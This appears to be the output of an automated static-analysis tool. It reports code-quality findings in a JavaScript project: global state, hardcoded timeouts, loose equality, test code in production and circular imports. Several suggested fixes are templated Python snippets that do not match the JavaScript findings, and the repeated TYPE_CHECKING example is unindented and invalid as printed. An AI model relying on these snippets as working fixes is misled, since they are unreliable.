1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: Test code in production files adds confusion and potential bloat. It may be accidentally executed or cause import errors in environments without test dependencies.

findings.title: Global mutable variable: captureOwnerStack
findings.description:
Global mutable state 'captureOwnerStack' makes code hard to reason about.

**Impact Analysis:**
📊 Used 4 times in this file
⚠️ Module is imported by others - global may leak
findings.suggested_fix:
Cross-module globals are especially dangerous. Consider:
1. Export a getter/setter function instead: `getCaptureOwnerStack()`, `setCaptureOwnerStack()`
2. Encapsulate in a class with controlled access
3. Use dependency injection
findings.why_it_matters: Global state causes hidden dependencies between functions. Changes to globals can have unexpected effects throughout the codebase.

findings.title: Hardcoded timeout: 5 seconds
findings.description:
Magic timeout value `5000` makes configuration and tuning difficult.

**Analysis:**
⏱️ Duration: 5 seconds
📍 Context: General timeout
📊 Same value used 4 times
findings.suggested_fix:
This timeout value appears 4 times. Extract to a centralized config:

```python
# config.py
TIMEOUT_5000MS = 5000  # 5 seconds

# usage
from config import TIMEOUT_5000MS
requests.get(url, timeout=TIMEOUT_5000MS/1000)
```
findings.why_it_matters: Hardcoded timeouts are hard to find, tune, and change across environments. Network timeouts especially need to be configurable based on deployment.

findings.suggested_fix: Break the cycle by extracting shared logic into a common helper, introducing an event system, or restructuring the call chain to be unidirectional.

findings.title: Test code in production: 2 issues
findings.description:
Test utilities and patterns found in what appears to be production code.

**Found:**
• Mock/stub objects (lines 3, 5)
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: Test code in production files adds confusion and potential bloat. It may be accidentally executed or cause import errors in environments without test dependencies.

findings.title: Regex compiled inside loop
findings.description:
Regex compiled in loop (loop starts line 15).

**Performance impact:** Regex compilation is expensive. In a loop of N iterations, this costs N compilations instead of 1.
findings.suggested_fix:
Move regex compilation outside the loop:
```rust
let re = Regex::new(pattern)?;  // Before loop
for item in items {
re.is_match(item);  // Reuse
}
```
findings.why_it_matters: Regex compilation involves parsing and optimization. Doing it once instead of N times can dramatically improve performance.

findings.title: Loose equality (==) used
findings.description:
== performs type coercion which can cause subtle bugs.

**Analysis:**
📦 In function: `isValidStore` (1 callers)
findings.why_it_matters:
Type coercion in == can cause unexpected behavior:
• '1' == 1 is true
• '' == false is true
• [] == false is true
Use === to compare both value AND type.

findings.title: Test code in production: 1 issue
findings.description:
Test utilities and patterns found in what appears to be production code.

**Found:**
• Test fixtures (line 23)
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: Test code in production files adds confusion and potential bloat. It may be accidentally executed or cause import errors in environments without test dependencies.

findings.title: Hardcoded timeout: 4 seconds
findings.description:
Magic timeout value `4000` makes configuration and tuning difficult.

**Analysis:**
⏱️ Duration: 4 seconds
📍 Context: General timeout
📊 Same value used 2 times
findings.suggested_fix:
Extract to a named constant:

```python
TIMEOUT_4000MS = 4000  # 4 seconds
```
findings.why_it_matters: Hardcoded timeouts are hard to find, tune, and change across environments. Network timeouts especially need to be configurable based on deployment.

findings.title: Loose equality (==) used
findings.description:
== performs type coercion which can cause subtle bugs.

**Analysis:**
📦 In function: `_toPropertyKey` (1 callers)
findings.why_it_matters:
Type coercion in == can cause unexpected behavior:
• '1' == 1 is true
• '' == false is true
• [] == false is true
Use === to compare both value AND type.

findings.title: Test code in production: 1 issue
findings.description:
Test utilities and patterns found in what appears to be production code.

**Found:**
• Test code (line 1)
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: Test code in production files adds confusion and potential bloat. It may be accidentally executed or cause import errors in environments without test dependencies.

findings.title: Circular dependency: 2 files
findings.description:
Mutual dependency between: ProfilerStore.js ↔ ProfilingCache.js

**Weakest link to break:** `ProfilerStore.js` → `ProfilingCache.js` (1 import)
findings.suggested_fix:
🔗 **Best place to break:** `ProfilerStore.js` → `ProfilingCache.js` (weakest coupling: 1 imports)

Since `ProfilerStore.js` only imports 1 symbol(s) from `ProfilingCache.js`, consider:
- Move those symbols to a shared module
- Pass them as parameters instead of importing
- Use dependency injection

**For small cycles:**
1. Merge tightly coupled modules if they're always used together
2. Use TYPE_CHECKING (Python) or type-only imports (TS) for type hints
3. Extract common code to a third module
findings.why_it_matters: Circular dependencies make code harder to understand, test, and maintain. They can cause import errors at runtime and make it difficult to refactor individual modules.

findings.title: Hardcoded timeout: 30 seconds

Magic timeout value `30000` makes configuration and tuning difficult.

**Analysis:**
⏱️ Duration: 30 seconds
📍 Context: General timeout
📊 Same value used 2 times
findings.suggested_fix:
Extract to a named constant:

```python
TIMEOUT_30000MS = 30000  # 30 seconds
```
findings.why_it_matters: Hardcoded timeouts are hard to find, tune, and change across environments. Network timeouts especially need to be configurable based on deployment.

findings.title: Circular dependency: 2 files
findings.description:
Mutual dependency between: VerticalScrollBarView.js ↔ VerticalScrollOverflowView.js

**Weakest link to break:** `VerticalScrollBarView.js` → `VerticalScrollOverflowView.js` (1 import)
findings.suggested_fix:
🔗 **Best place to break:** `VerticalScrollBarView.js` → `VerticalScrollOverflowView.js` (weakest coupling: 1 imports)

Since `VerticalScrollBarView.js` only imports 1 symbol(s) from `VerticalScrollOverflowView.js`, consider:
- Move those symbols to a shared module
- Pass them as parameters instead of importing
- Use dependency injection

**For small cycles:**
1. Merge tightly coupled modules if they're always used together
2. Use TYPE_CHECKING (Python) or type-only imports (TS) for type hints
3. Extract common code to a third module
findings.why_it_matters: Circular dependencies make code harder to understand, test, and maintain. They can cause import errors at runtime and make it difficult to refactor individual modules.

findings.title: Loose equality (==) used
findings.description:
[COMPOUND: 2 co-located issues] == performs type coercion which can cause subtle bugs.

**Analysis:**
📦 In function: `tokenize` (1 callers)
findings.why_it_matters:
Type coercion in == can cause unexpected behavior:
• '1' == 1 is true
• '' == false is true
• [] == false is true
Use === to compare both value AND type.

findings.title: Hardcoded timeout: 3 seconds
findings.description:
Magic timeout value `3000` makes configuration and tuning difficult.

**Analysis:**
⏱️ Duration: 3 seconds
📍 Context: General timeout
📊 Same value used 2 times
📦 In function: `initChrome`
findings.suggested_fix:
Extract to a named constant:

```python
TIMEOUT_3000MS = 3000  # 3 seconds
```
findings.why_it_matters: Hardcoded timeouts are hard to find, tune, and change across environments. Network timeouts especially need to be configurable based on deployment.

findings.title: Test code in production: 1 issue
findings.description:
Test utilities and patterns found in what appears to be production code.

**Found:**
• Spy functions (line 15)
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: Test code in production files adds confusion and potential bloat. It may be accidentally executed or cause import errors in environments without test dependencies.
